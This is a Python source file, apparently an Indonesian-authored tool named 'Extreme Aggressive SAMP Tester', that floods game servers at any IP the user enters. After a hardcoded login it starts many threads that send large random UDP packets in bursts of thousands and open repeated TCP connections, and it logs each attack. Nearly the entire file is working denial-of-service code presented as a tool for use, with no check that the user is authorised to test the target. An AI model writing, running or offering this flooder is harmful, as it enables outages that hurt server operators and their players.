import random
import socket
import threading
import time
import sys
import os
import logging

# Fungsi Login
def login():
    attempts = 0
    while attempts < 3:
        username = input("Enter your username: ")
        password = input("Enter your password: ")

        if username == "TATA" and password == "TATA":
            print("\nLogin successful! Welcome to the Aggressive SAMP Tester.\n")
            break
        else:
            print("Incorrect username or password. Please try again.\n")
            attempts += 1
            if attempts == 3:
                print("Too many failed attempts. Exiting...")
                sys.exit()

# Fitur Logging untuk analisis
log_dir = "attack_logs"
if not os.path.exists(log_dir):
    os.mkdir(log_dir)

log_file = os.path.join(log_dir, "attack_log.txt")
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

# Fungsi Menu ASCII
def display_menu():
    os.system('clear')
    print("""
    ██████╗ █████╗ ███╗   ███╗███████╗████████╗
    ██╔══██╗██╔══██╗████╗ ████║██╔════╝╚══██╔══╝
    ██████╔╝███████║██╔████╔██║█████╗     ██║   
    ██╔═══╝ ██╔══██║██║╚██╔╝██║██╔══╝     ██║   
    ██║     ██║  ██║██║ ╚═╝ ██║███████╗   ██║   
    ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝   ╚═╝   
    ===================================================
                    EXTREME AGGRESSIVE SAMP TESTER
    ===================================================
    """)
    print("1. Test SAMP server with EXTREME UDP & TCP attacks")
    print("2. View attack logs")
    print("3. Exit")
    print("=====================================================")

# Fungsi untuk menampilkan log serangan
def view_logs():
    try:
        with open(log_file, "r") as f:
            print("\nAttack Logs:")
            print(f.read())
    except FileNotFoundError:
        print("No logs found. Please run an attack first.\n")

# Fungsionalitas Pengaturan
def attack_samp():
    ip = str(input("Enter the target IP for SAMP server: "))
    port = int(input("Enter the target port (default SAMP port is 7777): ") or 7777)
    time_limit = int(input("Enter the duration of the test (seconds): "))
    threads = int(input("Enter the number of threads (higher = more aggressive): "))
    
    print("\nStarting EXTREME aggressive attack on server %s:%d" % (ip, port))
    print(f"Duration: {time_limit} seconds with {threads} threads.\n")

    # Meningkatkan ukuran paket untuk lebih membebani server
    packet_size = random._urandom(8192)  # Ukuran paket yang sangat besar (8 KB per paket)

    start_time = time.time()

    # Fungsi untuk mengirim paket UDP dengan lebih banyak tekanan
    def send_udp_packet():
        while time.time() - start_time < time_limit:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Mengirimkan 1000 paket sekaligus dalam satu iterasi
                for _ in range(1000):  
                    s.sendto(packet_size, (ip, port))  # Mengirim paket UDP yang sangat besar
                logging.info(f"Sent 1000 UDP packets to {ip}:{port}")
                print("[*] Sending 1000 UDP Packets to SAMP server!")
            except Exception as e:
                logging.error(f"Error sending UDP packet: {e}")
                print(f"[*] Error sending UDP packet: {e}")

    # Fungsi tambahan untuk pengiriman lebih banyak paket
    def send_multiple_packets():
        while time.time() - start_time < time_limit:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Kirimkan 5000 paket dalam satu kali iterasi
                for _ in range(5000):
                    s.sendto(packet_size, (ip, port))  
                logging.info(f"Sent 5000 UDP packets to {ip}:{port}")
                print("[*] Sending 5000 UDP Packets to SAMP server!")
            except Exception as e:
                logging.error(f"Error sending multiple UDP packets: {e}")
                print(f"[*] Error sending multiple UDP packets: {e}")

    # Fungsi yang mengirimkan paket lebih sering dan lebih agresif
    def send_extreme_packets():
        while time.time() - start_time < time_limit:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(10000):  # Kirimkan 10.000 paket dalam satu iterasi
                    s.sendto(packet_size, (ip, port))  
                logging.info(f"Sent 10,000 UDP packets to {ip}:{port}")
                print("[*] Sending 10,000 UDP Packets to SAMP server!")
            except Exception as e:
                logging.error(f"Error sending extreme UDP packets: {e}")
                print(f"[*] Error sending extreme UDP packets: {e}")

    # Fungsi untuk serangan TCP untuk tes lebih canggih
    def send_tcp_packets():
        while time.time() - start_time < time_limit:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(packet_size)  # Kirimkan paket TCP yang besar
                logging.info(f"Sent TCP packet to {ip}:{port}")
                print("[*] Sending TCP Packet to SAMP server!")
            except Exception as e:
                logging.error(f"Error sending TCP packet: {e}")
                print(f"[*] Error sending TCP packet: {e}")

    # Fungsi pengiriman paket hybrid (gabungan UDP dan TCP)
    def send_hybrid_packets():
        while time.time() - start_time < time_limit:
            try:
                if random.choice([True, False]):
                    send_udp_packet()  # Pilih secara acak untuk UDP
                else:
                    send_tcp_packets()  # Pilih TCP jika UDP tidak dipilih
            except Exception as e:
                logging.error(f"Error sending hybrid packets: {e}")
                print(f"[*] Error sending hybrid packets: {e}")

    # Menambahkan lebih banyak thread untuk meningkatkan "keganasan"
    for _ in range(threads):
        th = threading.Thread(target=send_hybrid_packets)  # Pilih untuk mengirim paket hybrid
        th.start()

    # Menunggu sampai waktu pengujian selesai
    time.sleep(time_limit)
    print(f"\nAggressive testing completed after {time_limit} seconds.")

# Fungsi utama
def main_menu():
    display_menu()
    choice = input("Choose an option: ")

    if choice == "1":
        attack_samp()
    elif choice == "2":
        view_logs()
    elif choice == "3":
        print("Exiting... Goodbye!")
        sys.exit()
    else:
        print("Invalid choice. Please try again.")
        main_menu()

# Fungsi utama yang menjalankan login dan menu
def main():
    login()  # Memanggil fungsi login untuk autentikasi pengguna
    while True:
        main_menu()  # Setelah login sukses, menuju menu utama

# Menjalankan Fungsi Utama
if __name__ == "__main__":
    main()
